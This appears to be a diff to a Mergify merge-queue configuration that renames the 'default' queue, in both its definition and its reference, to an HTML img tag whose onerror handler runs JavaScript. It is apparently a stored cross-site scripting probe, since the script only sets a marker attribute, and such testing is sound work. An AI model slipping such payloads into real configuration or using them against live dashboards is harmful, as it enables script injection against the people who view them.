@@ -1,5 +1,5 @@
 queue_rules:
-  - name: default
+  - name: '<img src=x onerror="document.body.setAttribute(`data-mergify-xss`,`queue-rule`)" />'
     queue_conditions:
       - check-success=lab-ci
     merge_conditions:
@@ -12,4 +12,4 @@ pull_request_rules:
       - label=merge-queue
     actions:
       queue:
-        name: default
+        name: '<img src=x onerror="document.body.setAttribute(`data-mergify-xss`,`queue-rule`)" />'
